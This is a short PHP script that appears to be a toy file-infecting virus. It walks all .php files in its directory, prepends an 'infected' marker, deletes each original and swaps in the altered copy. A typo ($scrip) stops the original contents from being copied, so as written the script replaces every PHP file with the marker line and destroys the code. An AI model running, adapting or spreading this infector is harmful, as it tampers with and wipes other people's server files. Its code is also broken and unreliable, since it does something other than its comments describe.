<?php

// Get a list of php files on this server
$filenames = glob('*.php');

// Check files
foreach( $filenames as $filename ) {
	
	//	Open file
	$script = fopen($filename, "r");
	
	//	let's write to a new file, as opposed to reading the whole
	//	script in to memory, to avoid issues with large files
	$infected = fopen("$filename.infected", "w");
	
	$infection = '<?php // FILE INFECTED ?>';
	fputs($infected, $infection, strlen($infection));

	while ( $contents = fgets($scrip) ) {
		fputs($infected, $contents, strlen($contents));
		
	}
	//close both handles, and move the infected file in to place
	fclose($script);
	fclose($infected);
	unlink("$filename");
	rename("$filename.infected", $filename);
}
